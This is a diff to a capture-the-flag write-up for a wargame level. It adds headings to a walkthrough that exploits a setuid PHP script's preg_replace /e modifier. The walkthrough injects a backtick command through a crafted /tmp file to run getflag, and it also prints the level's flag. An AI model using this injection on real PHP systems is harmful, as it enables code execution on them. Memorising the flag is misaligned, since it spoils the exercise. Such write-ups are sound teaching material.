@@ -1,5 +1,6 @@
 ## FLAG: `viuaaale9huek52boumoomioc`
 
+## We have a PHP script and its executable ?
 > ls -l
 ```
     total 12
@@ -7,6 +8,7 @@
     -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
 ```
 
+## What's in there ?
 > cat level06.php
 ```
     #!/usr/bin/php
@@ -20,6 +22,8 @@
 ## which must be a file `$a = file_get_contents($y);`
 ## It takes its content and put it through multiple regex
 ## `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)` can execute some code thanks to `/e`
+
+------------------------------------------------
 
 > echo '[x ${`getflag`}]' > /tmp/06_file && ./level06 /tmp/06_file
 ```
